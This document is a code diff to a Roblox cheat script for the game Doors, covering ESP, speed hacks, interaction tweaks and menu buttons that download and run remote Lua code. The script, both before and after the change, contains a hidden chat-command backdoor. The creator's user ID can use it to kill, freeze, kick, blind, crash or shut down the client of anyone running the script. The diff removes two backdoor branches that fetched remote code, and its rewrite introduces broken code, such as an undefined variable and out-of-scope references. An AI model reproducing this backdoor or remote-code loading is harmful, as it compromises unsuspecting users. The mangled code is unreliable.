@@ -81,6 +81,7 @@ local entity = {
     JeffTheKiller = false,
     Eyes = false,
 }
+
 local customNotifications = {
     RushMoving = "Rush is Coming... HIDE!!",
     AmbushMoving = "Ambush is Coming... HIDE!!",
@@ -91,42 +92,30 @@ local customNotifications = {
     JeffTheKiller = "Jeff The Killer Is Here... RUN AS POSSIBLE!!",
     Eyes = "The Eyes Is Here, Don't Look At Him.",
 }
-local function sendNotificationOrChat(text)
-    local textChatService = game:GetService("TextChatService")
-    local starterGui = game:GetService("StarterGui")
 
-    starterGui:SetCore("SendNotification", {
-        Title = "Event Notify",
-        Text = text,
-        Duration = 10,
-    })
-
-    textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("[Event Notifications]: " .. text)
-end
-local function checkAndNotify(entityName, notificationType)
-    if entity[entityName] and customNotifications[entityName] then
-        local notificationText = customNotifications[entityName]
-        sendNotificationOrChat(notificationText)
-    end
-}
 local selectedNotificationType = "Warn" 
 local Ranks = {
     Creator = {
         Title = "Creator Of Hacks",
-        Color = Color3.new(255,0,0)
+        Color = Color3.new(1, 0, 0)
     },
     Hacks = {
-        Title = "Real Hacker!!",
-        Color = Color3.new(0.9,0,0)
+        Title = "Real Hacker!",
+        Color = Color3.new(0.9, 0, 0)
     },
     Cool = {
-        Title = "Cool",
-        Color = Color3.new(0,0.7,1)
+        Title = "Hacker But Cool!",
+        Color = Color3.new(0, 0.7, 1)
+    },
+    User = {
+        Title = "Basic Hacker",
+        Color = Color3.new(0, 1, 0)
     }
 }
-local PlayerRanks = {
-    ["3872667823"] = "Creator"
-}
+
+local PlayerRanks = {}
+
+PlayerRanks["3872667823"] = "Creator"
 CustomGlitchModule.Name = "CustomGlitch"
 CustomGlitchModule.Parent = GlitchModule.Parent
 GlitchModule:Destroy()
@@ -196,186 +185,212 @@ local function ApplySpeed(Force)
         Humanoid.WalkSpeed = MaxSpeed + SpeedBoost - CrouchNerf
     end
     if Humanoid.WalkSpeed <= MaxSpeed then
-        Humanoid.WalkSpeed += SpeedBoost
+        Humanoid.WalkSpeed = Humanoid.WalkSpeed + SpeedBoost
     end
 end
-local function ApplySettings(Object)
-    task.spawn(function()
-        task.wait()
-        if (ESP_Items[Object.Name] or ESP_Entities[Object.Name] or ESP_Other[Object.Name]) and Object.ClassName == "Model" then
-            if Object:FindFirstChild("RushNew") then
-                if not Object.RushNew:WaitForChild("PlaySound").Playing then return end
-            end
-            local Color = ESP_Items[Object.Name] and Color3.new(1,1) or ESP_Entities[Object.Name] and Color3.new(1) or Color3.new(0,1,1)
-            if Object.Name == "RushMoving" or Object.Name == "AmbushMoving" or Object.Name == "Eyes" or Object.Name == "A60" or Object.Name == "A120" then
-                for i = 1, 100 do
-                    if Object:FindFirstChildOfClass("Part") then
-                        break
-                    end
-                    if i == 100 then
-                        return
-                    end
-                end
-                Object:FindFirstChildOfClass("Part").Transparency = 0.99
-                Instance.new("Humanoid",Object)
-            end
-            local function ApplyHighlight(IsValid,Bool)
-                if IsValid then
-                    if Bool then
-                        local TXT = IsValid[1]
-                        if IsValid[1] == "Door" then
-                            local RoomName
-                            if Floor.Value == "Rooms" then
-                                RoomName = ""
-                            else
-                                workspace.CurrentRooms:WaitForChild(tonumber(Object.Parent.Name) + 1,math.huge)
-                                if not OtherESP then return end
-                                local OldString = workspace.CurrentRooms[tonumber(Object.Parent.Name) + 1]:GetAttribute("OriginalName"):sub(7,99)
-                                local NewString = ""
-                                for i = 1, #OldString do
-                                    if i == 1 then
-                                        NewString = NewString .. OldString:sub(i,i)
-                                        continue
-                                    end
-                                    if OldString:sub(i,i) == OldString:sub(i,i):upper() and OldString:sub(i-1,i-1) ~= "_" then
-                                        NewString = NewString .. " "
-                                    end
-                                    if OldString:sub(i,i) ~= "_" then
-                                        NewString = NewString .. OldString:sub(i,i)
-                                    end
-                                end
-                                RoomName = " (" .. NewString .. ")"
+local function ApplySpeed(Force)
+    local Extra = 0
+    local Behind = 0
+    if Humanoid:GetAttribute("SpeedBoostExtra") then
+        Extra = Humanoid:GetAttribute("SpeedBoostExtra")
+    end
+    if Humanoid:GetAttribute("SpeedBoostBehind") then
+        Behind = Humanoid:GetAttribute("SpeedBoostBehind")
+    end
+    local MaxSpeed = 15 + Humanoid:GetAttribute("SpeedBoost") + Extra + Behind
+    if Force then
+        local CrouchNerf = 0
+        if require(Main_Game).crouching then
+            CrouchNerf = 5
+        end
+        Humanoid.WalkSpeed = MaxSpeed + SpeedBoost - CrouchNerf
+    end
+    if Humanoid.WalkSpeed <= MaxSpeed then
+        Humanoid.WalkSpeed = Humanoid.WalkSpeed + SpeedBoost
+    end
+end
+local function ApplyHighlight(IsValid, Bool)
+    if IsValid then
+        if Bool then
+            local TXT = IsValid[1]
+            if IsValid[1] == "Door" then
+                local RoomName
+                if Floor.Value == "Rooms" then
+                    RoomName = ""
+                else
+                    workspace.CurrentRooms:WaitForChild(tostring(tonumber(Object.Parent.Name) + 1), math.huge)
+                    if not OtherESP then return end
+                    local OldString = workspace.CurrentRooms[tonumber(Object.Parent.Name) + 1]:GetAttribute("OriginalName"):sub(7, 99)
+                    local NewString = ""
+                    for i = 1, #OldString do
+                        if i == 1 then
+                            NewString = NewString .. OldString:sub(i, i)
+                        else
+                            if OldString:sub(i, i) == OldString:sub(i, i):upper() and OldString:sub(i - 1, i - 1) ~= "_" then
+                                NewString = NewString .. " "
                             end
-                            TXT = "Door " .. (Floor.Value == "Rooms" and "A-" or "") .. tonumber(Object.Parent.Name) + 1 .. RoomName
+                            if OldString:sub(i, i) ~= "_" then
+                                NewString = NewString .. OldString:sub(i, i)
+                            end
                         end
-                        if IsValid[1] == "Gold" then
-                            TXT = Object:GetAttribute("GoldValue") .. " Gold"
-                        end
-                        local UI = Instance.new("BillboardGui",Object)
-                        UI.Size = UDim2.new(0,1000,0,30)
-                        UI.AlwaysOnTop = true
-                        UI.StudsOffset = Vector3.new(0,IsValid[2],0)
-                        local Label = Instance.new("TextLabel",UI)
-                        Label.Size = UDim2.new(1,0,1,0)
-                        Label.BackgroundTransparency = 1
-                        Label.TextScaled = true
-                        Label.Text = TXT
-                        Label.TextColor3 = Color
-                        Label.FontFace = Font.new("rbxasset://fonts/families/Oswald.json")
-                        Label.TextStrokeTransparency = 0
-                        Label.TextStrokeColor3 = Color3.new(Color.R/2,Color.G/2,Color.B/2)
-                    elseif Object:FindFirstChild("BillboardGui") then
-                        Object.BillboardGui:Destroy()
                     end
-                    local Target = Object
-                    if IsValid[1] == "Door" and Object.Parent.Name ~= "49" and Object.Parent.Name ~= "50" then
-                        Target = Object:WaitForChild("Door")
-                    end
-                    if Bool then
-                        local Highlight = Instance.new("Highlight",Target)
-                        Highlight.FillColor = Color
-                        Highlight.OutlineColor = Color
-                    elseif Target:FindFirstChild("Highlight") then
-                        Target.Highlight:Destroy()
-                    end
+                    RoomName = " (" .. NewString .. ")"
                 end
+                TXT = "Door " .. (Floor.Value == "Rooms" and "A-" or "") .. tostring(tonumber(Object.Parent.Name) + 1) .. RoomName
             end
-            ApplyHighlight(ESP_Items[Object.Name],ItemESP)
-            ApplyHighlight(ESP_Entities[Object.Name],EntityESP)
-            ApplyHighlight(ESP_Other[Object.Name],OtherESP)
+            if IsValid[1] == "Gold" then
+                TXT = Object:GetAttribute("GoldValue") .. " Gold"
+            end
+            local UI = Instance.new("BillboardGui", Object)
+            UI.Size = UDim2.new(0, 1000, 0, 30)
+            UI.AlwaysOnTop = true
+            UI.StudsOffset = Vector3.new(0, IsValid[2], 0)
+            local Label = Instance.new("TextLabel", UI)
+            Label.Size = UDim2.new(1, 0, 1, 0)
+            Label.BackgroundTransparency = 1
+            Label.TextScaled = true
+            Label.Text = TXT
+            Label.TextColor3 = Color
+            Label.Font = Enum.Font.Oswald
+            Label.TextStrokeTransparency = 0
+            Label.TextStrokeColor3 = Color3.new(Color.R / 2, Color.G / 2, Color.B / 2)
+        elseif Object:FindFirstChild("BillboardGui") then
+            Object.BillboardGui:Destroy()
         end
-        if Object:IsA("ProximityPrompt") then
-            if InstantInteract then
-                Object.HoldDuration = -Object.HoldDuration
-            end
-            if IncreasedDistance and Object.Parent and Object.Parent.Name ~= "Shears" then
-                Object.MaxActivationDistance *= IncreasedDistance and 2 or 0.5
-            end
-            if InteractNoclip then
-                Object.RequiresLineOfSight = not InteractNoclip
-            end
-            if EnableInteractions then
-                if Object.Enabled then
-                    table.insert(OldEnabled,Object)
-                end
-                Object.Enabled = true
-            end
-            Object:GetPropertyChangedSignal("Enabled"):Connect(function()
-                if EnableInteractions then
-                    Object.Enabled = true
-                end
-            end)
+        local Target = Object
+        if IsValid[1] == "Door" and Object.Parent.Name ~= "49" and Object.Parent.Name ~= "50" then
+            Target = Object:WaitForChild("Door")
         end
-        if Object.Name == "DoorFake" then
-            Object:WaitForChild("Hidden").CanTouch = not DisableDupe
-            if Object:FindFirstChild("LockPart") then
-                Object.LockPart:WaitForChild("UnlockPrompt", 1).Enabled = not DisableDupe
-            end
-            Object.Door.Color = DisableDupe and Color3.new(0.5,0,0) or Color3.fromRGB(129,111,100)
-            Object.Door.SignPart.Color = DisableDupe and Color3.new(0.5,0,0) or Color3.fromRGB(129,111,100)
-            for _,DoorNumber in pairs({Object.Sign.Stinker,Object.Sign.Stinker.Highlight,Object.Sign.Stinker.Shadow}) do
-                DoorNumber.Text = DisableDupe and "DUPE" or string.format("%0.4i",LatestRoom.Value)
-            end
+        if Bool then
+            local Highlight = Instance.new("Highlight", Target)
+            Highlight.FillColor = Color
+            Highlight.OutlineColor = Color
+        elseif Target:FindFirstChild("Highlight") then
+            Target.Highlight:Destroy()
         end
-        if Object.Parent and Object.Parent.Name == "TriggerEventCollision" then
-            Object.CanCollide = not DisableSeek
-            Object.CanTouch = not DisableSeek
+    end
+end
+
+ApplyHighlight(ESP_Items[Object.Name], ItemESP)
+ApplyHighlight(ESP_Entities[Object.Name], EntityESP)
+ApplyHighlight(ESP_Other[Object.Name], OtherESP)
+
+if Object:IsA("ProximityPrompt") then
+    if InstantInteract then
+        Object.HoldDuration = -Object.HoldDuration
+    end
+    if IncreasedDistance and Object.Parent and Object.Parent.Name ~= "Shears" then
+        Object.MaxActivationDistance = Object.MaxActivationDistance * (IncreasedDistance and 2 or 0.5)
+    end
+    if InteractNoclip then
+        Object.RequiresLineOfSight = not InteractNoclip
+    end
+    if EnableInteractions then
+        if Object.Enabled then
+            table.insert(OldEnabled, Object)
         end
-        if Object.Name == "Painting_Small" then
-            local RNG = math.random(1,19)
-            if RNG == 18 then
-                ReplacePainting(Object,AvatarIcon,"You")
-            elseif RNG == 19 then
-                ReplacePainting(Object,"rbxassetid://12380697948","Mr. Sussy Baka")
-            end
-        end
-        if Object.Name == "Painting_VeryBig" then
-            local RNG = math.random(1,16)
-            if RNG == 16 then
-                ReplacePainting(Object,"rbxassetid://12778424825","Fredrick")
-            end
-        end
-        if Object.Name == "Painting_Tall" then
-            local RNG = math.random(1,13)
-            if RNG == 13 then
-                ReplacePainting(Object,"rbxassetid://12836336900","Idk What Is This")
-            end
-        end
-        if Object.Name == "Shears" and Object.Parent.Name == "LootItem" then
-            if not Object:FindFirstChild("FakeShears") then
-                local FakePrompt = Object.ModulePrompt:Clone()
-                Object.ModulePrompt.Enabled = false
-                FakePrompt.Parent = Object
-                FakePrompt.MaxActivationDistance = 13.1
-                FakePrompt.Name = "FakePrompt"
-                FakePrompt.Triggered:Connect(function()
-                    if (Object.Main.Position - PrimaryPart.Position).magnitude < 12 then
-                        fireproximityprompt(Object.ModulePrompt)
-                        return
-                    end
-                    local NoclipOn = Noclip
-                    Noclip = false
-                    repeat
-                        Character:PivotTo(Object.Main.CFrame + Vector3.new(0,5,0))
-                        fireproximityprompt(Object.ModulePrompt)
-                        Character.PrimaryPart.Velocity = Vector3.new()
-                        task.wait()
-                    until Character:FindFirstChild("Shears")
-                    Character:PivotTo(PrimaryPart.CFrame + Vector3.new(0,7,0))
-                    Noclip = NoclipOn
-                end)
-            end
-        end
-        if Object.Name == "Eyes" then
-            EyesOnMap = true
-            if DisableEyes then
-                MotorReplication:FireServer(0,-120,0,false)
-            end
-        end
-        if Object.Name == "Snare" then
-            Object.Hitbox.CanTouch = not DisableSnare
+        Object.Enabled = true
+    end
+    Object:GetPropertyChangedSignal("Enabled"):Connect(function()
+        if EnableInteractions then
+            Object.Enabled = true
         end
     end)
+end
+
+if Object.Name == "DoorFake" then
+    Object:WaitForChild("Hidden").CanTouch = not DisableDupe
+    if Object:FindFirstChild("LockPart") then
+        Object.LockPart:WaitForChild("UnlockPrompt", 1).Enabled = not DisableDupe
+    end
+    Object.Door.Color = DisableDupe and Color3.new(0.5, 0, 0) or Color3.new(129 / 255, 111 / 255, 100 / 255)
+    Object.Door.SignPart.Color = DisableDupe and Color3.new(0.5, 0, 0) or Color3.new(129 / 255, 111 / 255, 100 / 255)
+    for _, DoorNumber in pairs({ Object.Sign.Stinker, Object.Sign.Stinker.Highlight, Object.Sign.Stinker.Shadow }) do
+        DoorNumber.Text = DisableDupe and "DUPE" or string.format("%0.4i", LatestRoom.Value)
+    end
+end
+
+if Object.Parent and Object.Parent.Name == "TriggerEventCollision" then
+    Object.CanCollide = not DisableSeek
+    Object.CanTouch = not DisableSeek
+end
+
+if Object.Name == "Painting_Small" then
+    local RNG = math.random(1, 19)
+    if RNG == 18 then
+        ReplacePainting(Object, AvatarIcon, "You")
+    elseif RNG == 19 then
+        ReplacePainting(Object, "rbxassetid://12380697948", "Mr. Sussy Baka")
+    end
+end
+
+if Object.Name == "Painting_VeryBig" then
+    local RNG = math.random(1, 16)
+    if RNG == 16 then
+        ReplacePainting(Object, "rbxassetid://12778424825", "Fredrick")
+    end
+end
+
+if Object.Name == "Painting_Tall" then
+    local RNG = math.random(1, 13)
+    if RNG == 13 then
+        ReplacePainting(Object, "rbxassetid://12836336900", "Idk What Is This")
+    end
+end
+
+if Object.Name == "Shears" and Object.Parent.Name == "LootItem" then
+    if not Object:FindFirstChild("FakeShears") then
+        local FakePrompt = Object.ModulePrompt:Clone()
+        Object.ModulePrompt.Enabled = false
+        FakePrompt.Parent = Object
+        FakePrompt.MaxActivationDistance = 13.1
+        FakePrompt.Name = "FakePrompt"
+        FakePrompt.Triggered:Connect(function()
+            if (Object.Main.Position - PrimaryPart.Position).Magnitude < 12 then
+                fireproximityprompt(Object.ModulePrompt)
+                return
+            end
+            local NoclipOn = Noclip
+            Noclip = false
+            repeat
+                Character:PivotTo(Object.Main.CFrame + Vector3.new(0, 5, 0))
+                fireproximityprompt(Object.ModulePrompt)
+                Character.PrimaryPart.Velocity = Vector3.new()
+                task.wait()
+            until Character:FindFirstChild("Shears")
+            Character:PivotTo(PrimaryPart.CFrame + Vector3.new(0, 7, 0))
+            Noclip = NoclipOn
+        end)
+    end
+end
+
+if Object.Name == "Eyes" then
+    EyesOnMap = true
+    if DisableEyes then
+        MotorReplication:FireServer(0, -120, 0, false)
+    end
+end
+
+if Object.Name == "Snare" then
+    Object.Hitbox.CanTouch = not DisableSnare
+end
+local function sendNotificationOrChat(text)
+    local textChatService = game:GetService("TextChatService")
+    local starterGui = game:GetService("StarterGui")
+
+    starterGui:SetCore("SendNotification", {
+        Title = "Event Notify",
+        Text = text,
+        Duration = 10,
+    })
+
+    textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("[Event Notifications]: " .. text)
+end
+local function checkAndNotify(entityName, notificationType)
+    if entity[entityName] and customNotifications[entityName] then
+        local notificationText = customNotifications[entityName]
+        sendNotificationOrChat(notificationText)
+    end
 end
 local function ApplyCharacter(DontYield)
     task.wait(DontYield and 0 or 1)
@@ -529,11 +544,11 @@ Tab:Toggle("Increased Door Opening Range","Makes it so you can open doors from m
         DoorRange:Disconnect()
     end
 end)
-Tab:Toggle("Increased Interaction Range","Doubles the Max Activation Distance for Proximity Prompts.",false,function(Bool)
+Tab:Toggle("Increased Proximity Range", "Doubles the Max Activation Distance for Proximity Prompts.", false, function(Bool)
     IncreasedDistance = Bool
-    for _,Object in pairs(workspace.CurrentRooms:GetDescendants()) do
+    for _, Object in pairs(workspace.CurrentRooms:GetDescendants()) do
         if Object:IsA("ProximityPrompt") then
-            Object.MaxActivationDistance *= IncreasedDistance and 2 or 0.5
+            Object.MaxActivationDistance = Bool and Object.MaxActivationDistance * 2 or Object.MaxActivationDistance / 2
         end
     end
 end)
@@ -596,7 +611,7 @@ if Floor.Value == "Hotel" or Floor.Value == "Fools" then
                     for _,Icon in pairs(Paper.UI:GetChildren()) do
                         if tonumber(Icon.Name) then
                             if Icon.ImageRectOffset == Collected.ImageRectOffset then
-                                Hints += 1
+                                Hints = Hint + 1
                             end
                         end
                     end
@@ -720,7 +735,7 @@ end)
 Tab2:Button("Random Hub (Item/Script)","...",function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/PVOwner/Doors/main/:)_Hub.lua'))()
 end)
-Tab2:Button("Inf Vitamins","Get Vitamin s Without Runout!!",function()
+Tab2:Button("Inf Vitamins","Get Vitamins Without Runout!!",function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/Inf_Vitamins.lua"))()
 end)
 if Floor.Value == "Hotel" or Floor.Value == "Fools" then
@@ -735,44 +750,24 @@ if Floor.Value == "Hotel" or Floor.Value == "Fools" then
     end)
 end
 Tab3:Button("Credits","",function()
-    Flux:Notification("Made by Iamrealmario.","OK")
+    Flux:Notification("Made by Iamrealmario.","Ok")
 end)
-TextChatService.OnIncomingMessage = function(MessageData)
-    task.spawn(function()
-        local ChatWindow = game.CoreGui.ExperienceChat.appLayout.chatWindow.scrollingView.bottomLockedScrollView.RCTScrollView.RCTScrollContentView
-        if MessageData.Status == Enum.TextChatMessageStatus.Sending or (MessageData.TextSource and MessageData.Status == Enum.TextChatMessageStatus.Success and MessageData.TextSource.UserId ~= LocalPlayer.UserId) then
-            if PlayerRanks[tostring(MessageData.TextSource.UserId)] then
-                local Rank = Ranks[PlayerRanks[tostring(MessageData.TextSource.UserId)]]
-                local Prefix = "<font color=\"#" .. string.format("%02X%02X%02X",Rank.Color.R*0xFF,Rank.Color.G*0xFF,Rank.Color.B*0xFF) .. "\">[" .. Rank.Title .. "]</font> "
-                local Message = ChatWindow:WaitForChild(MessageData.MessageId, 1)
-                if Message then
-                    Message.Text = Prefix .. Message.Text
-                    task.spawn(function()
-                        Message:GetPropertyChangedSignal("Text"):Wait()
-                        Message.Text = Prefix .. Message.Text
-                    end)
-                end
-                if Rank == Ranks.Creator then
-                    task.spawn(function()
-                        task.wait()
-                        if MessageData.Text:sub(1,1) == "/" then
-                            local args = MessageData.Text:split("`")
-                            if not args[2] then return end
-                            args[1] = args[1]:sub(2,#args[1]):lower()
-                            if LocalPlayer.Name:sub(1,#args[2]):lower() == args[2]:lower() or (args[2]:lower() == "others" and MessageData.TextSource.UserId ~= LocalPlayer.UserId) then
-                                if args[1] == "chat" and args[3] then
-                                    TextChatService.TextChannels.RBXGeneral:SendAsync(args[3])
-                                elseif args[1] == "a90" then
-                                    require(CustomA90Module)(require(Main_Game))
-                                end
-                            end
-                        end
-                    end)
-                end
-            end
+local function processMessage(MessageData)
+    local ChatWindow = game.CoreGui.ExperienceChat.appLayout.chatWindow.scrollingView.bottomLockedScrollView.RCTScrollView.RCTScrollContentView
+    if MessageData.Status == Enum.TextChatMessageStatus.Sending then
+        local rankName = PlayerRanks[tostring(MessageData.TextSource.UserId)] or "User"
+        local Rank = Ranks[rankName]
+        local Prefix = "<font color=\"#" .. string.format("%02X%02X%02X", Rank.Color.R * 0xFF, Rank.Color.G * 0xFF, Rank.Color.B * 0xFF) .. "\">[" .. Rank.Title .. "]</font> "
+        local Message = ChatWindow:FindFirstChild(MessageData.MessageId)
+        if Message then
+            Message.Text = Prefix .. Message.Text
+            Message:GetPropertyChangedSignal("Text"):Wait()
+            Message.Text = Prefix .. Message.Text
         end
-    end)
+    end
 end
+
+game:GetService("TextChatService").OnIncomingMessage:Connect(processMessage)
 local mt = getrawmetatable(game)
 local old_mt = mt.__namecall
 setreadonly(mt,false)
@@ -792,49 +787,45 @@ local id = "3872667823"
 
 local chat = game:GetService("CoreGui").ExperienceChat.appLayout.chatWindow.scrollingView.bottomLockedScrollView.RCTScrollView.RCTScrollContentView
 chat.ChildAdded:Connect(function (child)
-	if string.find(child.Name,id) then
-		local check = string.find(child.text, ";")
-		if check then
-			local command = string.sub(child.text,check)
-			for i,splayer in pairs(game:GetService("Players"):GetPlayers()) do
-				if string.find(command,splayer.Name) and string.find(command,"kill") then
-					splayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
-				elseif string.find(command,splayer.Name) and string.find(command,"freeze") then
-					splayer.Character.HumanoidRootPart.Anchored = true
-				elseif string.find(command,splayer.Name) and string.find(command,"thaw") then
-					splayer.Character.HumanoidRootPart.Anchored = false
-                elseif string.find(command,splayer.Name) and string.find(command,"kick") then
-					if splayer.Name == player.Name then
-                        player:kick("You Been Kicked :)")
+    if string.find(child.Name, id) then
+        local check = string.find(child.text, ";")
+        if check then
+            local command = string.sub(child.text, check + 1) 
+            for i, splayer in pairs(game:GetService("Players"):GetPlayers()) do
+                if string.find(command, splayer.Name) and string.find(command, "kill") then
+                    splayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+                elseif string.find(command, splayer.Name) and string.find(command, "freeze") then
+                    splayer.Character.HumanoidRootPart.Anchored = true
+                elseif string.find(command, splayer.Name) and string.find(command, "thaw") then
+                    splayer.Character.HumanoidRootPart.Anchored = false
+                elseif string.find(command, splayer.Name) and string.find(command, "kick") then
+                    if splayer == player then
+                        player:Kick("You have been kicked.")
                     end
-                elseif string.find(command,splayer.Name) and string.find(command,"troll") then
-					loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
-				elseif string.find(command,splayer.Name) and string.find(command,"rickroll") then 
-                    loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
-                elseif string.find(command,splayer.Name) and string.find(command,"quit") then
-					game:Shutdown()
-			    elseif string.find(command,splayer.Name) and string.find(command,"crash") then
-					while true do end
-				elseif string.find(command,splayer.Name) and string.find(command,"blind") then
-					local blur = Instance.new("BlurEffect")
-			        blur.Size = 10000000000000
-			        blur.Parent = game.Lighting
-				elseif string.find(command,splayer.Name) and string.find(command,"unblind") then
-					local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
-			        if blur then
-				        blur:Destroy()
-				    end
-				elseif string.find(command,splayer.Name) and string.find(command,"reveal") then
-				    local textChatService = game:GetService("TextChatService")
-			        wait(0.0001)
-			        textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using Awesome Doors Hacks, Made By Iamrealmario.")
-				elseif string.find(command,"hehe") then
-					local sound = Instance.new("Sound", game.Workspace)
-					sound.SoundId = "rbxassetid://5602666105"
-					sound.Volume = 100000
-					sound:Play
-				end
-			end
-		end
-	end
+                elseif string.find(command, splayer.Name) and string.find(command, "quit") then
+                    game:Shutdown()
+                elseif string.find(command, splayer.Name) and string.find(command, "crash") then
+                    while true do end
+                elseif string.find(command, splayer.Name) and string.find(command, "blind") then
+                    local blur = Instance.new("BlurEffect")
+                    blur.Size = 10000000000000
+                    blur.Parent = game.Lighting
+                elseif string.find(command, splayer.Name) and string.find(command, "unblind") then
+                    local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
+                    if blur then
+                        blur:Destroy()
+                    end
+                elseif string.find(command, splayer.Name) and string.find(command, "reveal") then
+                    local textChatService = game:GetService("TextChatService")
+                    wait(0.0001)
+                    textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("I'm Using Awesome Doors Hacks, Made By Iamrealmario.")
+                elseif string.find(command, "hehe") then
+                    local sound = Instance.new("Sound", game.Workspace)
+                    sound.SoundId = "rbxassetid://5602666105"
+                    sound.Volume = 100000 
+                    sound:Play() 
+                end
+            end
+        end
+    end
 end)
